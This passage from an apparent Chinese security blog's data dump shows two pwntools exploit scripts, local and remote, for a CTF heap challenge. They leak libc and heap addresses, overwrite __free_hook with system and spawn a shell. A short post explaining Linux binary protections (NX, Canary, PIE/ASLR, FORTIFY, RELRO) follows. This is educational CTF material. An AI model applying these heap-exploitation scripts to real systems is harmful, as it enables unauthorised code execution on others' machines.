class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ls</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ls&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ru(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;cat &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">touch</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;touch &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gedit</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;gedit &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rm</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;rm &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ln</span>(<span class=\"params\">src,dest</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ln &#x27;</span>+<span class=\"built_in\">str</span>(src)+<span class=\"string\">&#x27; &#x27;</span>+<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"comment\"># file0 --&gt; file6</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># use to leak libc</span></span><br><span class=\"line\"><span class=\"comment\"># file7 == file8</span></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file9&#x27;</span>,<span class=\"string\">&#x27;cccccccc&#x27;</span>) <span class=\"comment\"># escape for being combined into top chunk</span></span><br><span class=\"line\"><span class=\"comment\"># use to leak heap</span></span><br><span class=\"line\"><span class=\"comment\"># file1 == file10</span></span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file1&#x27;</span>,<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  rm(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file7&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">libc_addr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">malloc_hook=libc_addr-<span class=\"number\">96</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">libcbase=malloc_hook-libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">free_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap addr</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x2a0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite free hook</span></span><br><span class=\"line\">payload=p64(free_hook)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">gedit(<span class=\"string\">&#x27;file10&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">11</span>+i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;sys_addr&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;malloc_hook&#x27;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;free_hook&#x27;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;heapbase&#x27;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get free_hook</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file17&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file18&#x27;</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file18&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>远程exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;sh_v1.1&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;121.40.89.206&#x27;</span>,<span class=\"number\">34883</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ls</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ls&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ru(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;cat &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">touch</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;touch &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gedit</span>(<span class=\"params\">filename,filedata</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;gedit &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(filedata))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rm</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;rm &#x27;</span>+<span class=\"built_in\">str</span>(filename))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ln</span>(<span class=\"params\">src,dest</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;ln &#x27;</span>+<span class=\"built_in\">str</span>(src)+<span class=\"string\">&#x27; &#x27;</span>+<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"comment\"># file0 --&gt; file6</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># use to leak libc</span></span><br><span class=\"line\"><span class=\"comment\"># file7 == file8</span></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file7&#x27;</span>,<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file9&#x27;</span>,<span class=\"string\">&#x27;cccccccc&#x27;</span>) <span class=\"comment\"># escape for being combined into top chunk</span></span><br><span class=\"line\"><span class=\"comment\"># use to leak heap</span></span><br><span class=\"line\"><span class=\"comment\"># file1 == file10</span></span><br><span class=\"line\">ln(<span class=\"string\">&#x27;file1&#x27;</span>,<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fill in tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">  rm(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file7&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file8&#x27;</span>)</span><br><span class=\"line\">libc_addr=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">malloc_hook=libc_addr-<span class=\"number\">96</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap addr</span></span><br><span class=\"line\">cat(<span class=\"string\">&#x27;file10&#x27;</span>)</span><br><span class=\"line\">heapbase=uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])-<span class=\"number\">0x2a0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class=\"line\">libcbase=malloc_hook-libc.dump(<span class=\"string\">&#x27;__malloc_hook&#x27;</span>)</span><br><span class=\"line\">free_hook=libcbase+libc.dump(<span class=\"string\">&#x27;__free_hook&#x27;</span>)</span><br><span class=\"line\">sys_addr=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;sys_addr&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;malloc_hook&#x27;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;free_hook&#x27;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;heapbase&#x27;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite free_hook</span></span><br><span class=\"line\">payload=p64(free_hook)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">gedit(<span class=\"string\">&#x27;file10&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">  touch(<span class=\"string\">&#x27;file&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">11</span>+i),<span class=\"string\">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get free_hook</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file17&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\">touch(<span class=\"string\">&#x27;file18&#x27;</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">rm(<span class=\"string\">&#x27;file18&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"linux pwn中的保护","date":"2023-01-01T16:00:01.000Z","_content":"安全是在攻防之中进步的，有了对漏洞的利用之后，就会有该漏洞的防护。\n\n在pwn的过程中，通过checksec命令查看保护即可以知道什么方法在这次利用不太好使用中，以及在利用过程中要注意绕过什么保护。\n\nlinux中常见的保护大概有5种，分别为：\n\n1. NX\n2. Canary\n3. PIE/ASLR\n4. FORTIFY\n5. RELRO\n<!--more-->\n\n## NX\n\nNX保护主要用于防护**shellcode** 的攻击。通过将数据（栈、堆）所在的内存页标注为**不可执行**，防止程序在溢出后在该内存页上执行写入的shellcode。当程序试图在数据页上执行指令时，该指令会无法执行，并且CPU会抛出异常。\n\n## Canary\n\nCanary保护主要用于防护**栈溢出**的攻击。在函数执行前在栈中插入一段canary值，函数返回时验证canary的值是否一致来判断是否发生栈溢出。如果canary被修改，则程序停止运行，防止栈溢出覆盖函数返回地址。在push ebp(或rbp)后就将canary push入栈，因此如果要覆盖函数返回地址必须要先覆盖在其之前的ebp(或rbp)和canary。\n\n## PIE/ASLR\n\nPIE和ASLR保护主要用于防护**ROP**的攻击。PIE保护会使程序地址空间分布随机化（随机化代码段、数据段、bss段的基地址），即程序起始地址位置不确定。如果没开启PIE保护，则程序的起始地址是确定的（0x400000或0x804000）。ASLR保护会使程序加载地址随机化（随机化栈的基地址、libc的基地址、mmap的基地址、堆的基地址），增加找到攻击函数（如libc中的system）的难度。\n\n## FORTIFY\n\nFORTIFY保护主要用于防护**格式化字符串**的攻击。包含%n的格式化字符串不能位于程序内存中的可写地址（防止写入），当使用位置参数时，必须使用范围内的所有位置参数，如果使用%5$x，要先使用1\\$、2\\$、3\\$、4\\$（防止泄露）。\n\n## RELRO\n\nRELRO保护主要用于防护对**GOT表**的攻击。设置符号重定向表为只读并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。","source":"_posts/protect.md","raw":"---\ntitle: linux pwn中的保护\ndate: 2023-01-02 00:00:01\ncategories: \n- pwn\ntags: \n- pwn\n---\n安全是在攻防之中进步的，有了对漏洞的利用之后，就会有该漏洞的防护。\n\n在pwn的过程中，通过checksec命令查看保护即可以知道什么方法在这次利用不太好使用中，以及在利用过程中要注意绕过什么保护。\n\nlinux中常见的保护大概有5种，分别为：\n\n1. NX\n2. Canary\n3. PIE/ASLR\n4. FORTIFY\n5. RELRO\n<!--more-->\n\n## NX\n\nNX保护主要用于防护**shellcode** 的攻击。通过将数据（栈、堆）所在的内存页标注为**不可执行**，防止程序在溢出后在该内存页上执行写入的shellcode。当程序试图在数据页上执行指令时，该指令会无法执行，并且CPU会抛出异常。\n\n## Canary\n\nCanary保护主要用于防护**栈溢出**的攻击。在函数执行前在栈中插入一段canary值，函数返回时验证canary的值是否一致来判断是否发生栈溢出。如果canary被修改，则程序停止运行，防止栈溢出覆盖函数返回地址。在push ebp(或rbp)后就将canary push入栈，因此如果要覆盖函数返回地址必须要先覆盖在其之前的ebp(或rbp)和canary。\n\n## PIE/ASLR\n\nPIE和ASLR保护主要用于防护**ROP**的攻击。PIE保护会使程序地址空间分布随机化（随机化代码段、数据段、bss段的基地址），即程序起始地址位置不确定。如果没开启PIE保护，则程序的起始地址是确定的（0x400000或0x804000）。ASLR保护会使程序加载地址随机化（随机化栈的基地址、libc的基地址、mmap的基地址、堆的基地址），增加找到攻击函数（如libc中的system）的难度。\n\n## FORTIFY\n\nFORTIFY保护主要用于防护**格式化字符串**的攻击。包含%n的格式化字符串不能位于程序内存中的可写地址（防止写入），当使用位置参数时，必须使用范围内的所有位置参数，如果使用%5$x，要先使用1\\$、2\\$、3\\$、4\\$（防止泄露）。\n\n## RELRO\n\nRELRO保护主要用于防护对**GOT表**的攻击。设置符号重定向表为只读并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。","slug":"protect","published":1,"updated":"2023-01-03T15:07:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagf005f5oud1l4314c8","content":"<p>安全是在攻防之中进步的，有了对漏洞的利用之后，就会有该漏洞的防护。</p>\n<p>在pwn的过程中，通过checksec命令查看保护即可以知道什么方法在这次利用不太好使用中，以及在利用过程中要注意绕过什么保护。</p>\n<p>linux中常见的保护大概有5种，分别为：</p>\n<ol>\n<li>NX</li>\n<li>Canary</li>\n<li>PIE/ASLR</li>\n<li>FORTIFY</li>\n<li>RELRO<span id=\"more\"></span></li>\n</ol>\n<h2 id=\"NX\"><a href=\"#NX\" class=\"headerlink\" title=\"NX\"></a>NX</h2><p>NX保护主要用于防护<strong>shellcode</strong> 的攻击。通过将数据（栈、堆）所在的内存页标注为<strong>不可执行</strong>，防止程序在溢出后在该内存页上执行写入的shellcode。当程序试图在数据页上执行指令时，该指令会无法执行，并且CPU会抛出异常。</p>\n<h2 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h2><p>Canary保护主要用于防护<strong>栈溢出</strong>的攻击。在函数执行前在栈中插入一段canary值，函数返回时验证canary的值是否一致来判断是否发生栈溢出。如果canary被修改，则程序停止运行，防止栈溢出覆盖函数返回地址。在push ebp(或rbp)后就将canary push入栈，因此如果要覆盖函数返回地址必须要先覆盖在其之前的ebp(或rbp)和canary。</p>\n<h2 id=\"PIE-ASLR\"><a href=\"#PIE-ASLR\" class=\"headerlink\" title=\"PIE/ASLR\"></a>PIE/ASLR</h2><p>PIE和ASLR保护主要用于防护<strong>ROP</strong>的攻击。PIE保护会使程序地址空间分布随机化（随机化代码段、数据段、bss段的基地址），即程序起始地址位置不确定。如果没开启PIE保护，则程序的起始地址是确定的（0x400000或0x804000）。ASLR保护会使程序加载地址随机化（随机化栈的基地址、libc的基地址、mmap的基地址、堆的基地址），增加找到攻击函数（如libc中的system）的难度。</p>\n<h2 id=\"FORTIFY\"><a href=\"#FORTIFY\" class=\"headerlink\" title=\"FORTIFY\"></a>FORTIFY</h2><p>FORTIFY保护主要用于防护<strong>格式化字符串</strong>的攻击。包含%n的格式化字符串不能位于程序内存中的可写地址（防止写入），当使用位置参数时，必须使用范围内的所有位置参数，如果使用%5$x，要先使用1$、2$、3$、4$（防止泄露）。</p>\n<h2 id=\"RELRO\"><a href=\"#RELRO\" class=\"headerlink\" title=\"RELRO\"></a>RELRO</h2><p>RELRO保护主要用于防护对<strong>GOT表</strong>的攻击。设置符号重定向表为只读并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。</p>\n","site":{"data":{}},"excerpt":"<p>安全是在攻防之中进步的，有了对漏洞的利用之后，就会有该漏洞的防护。</p>\n<p>在pwn的过程中，通过checksec命令查看保护即可以知道什么方法在这次利用不太好使用中，以及在利用过程中要注意绕过什么保护。</p>\n<p>linux中常见的保护大概有5种，分别为：</p>\n<ol>\n<li>NX</li>\n<li>Canary</li>\n<li>PIE/ASLR</li>\n<li>FORTIFY</li>\n<li>RELRO","more":"</li>\n</ol>\n<h2 id=\"NX\"><a href=\"#NX\" class=\"headerlink\" title=\"NX\"></a>NX</h2><p>NX保护主要用于防护<strong>shellcode</strong> 的攻击。通过将数据（栈、堆）所在的内存页标注为<strong>不可执行</strong>，防止程序在溢出后在该内存页上执行写入的shellcode。当程序试图在数据页上执行指令时，该指令会无法执行，并且CPU会抛出异常。</p>\n<h2 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" 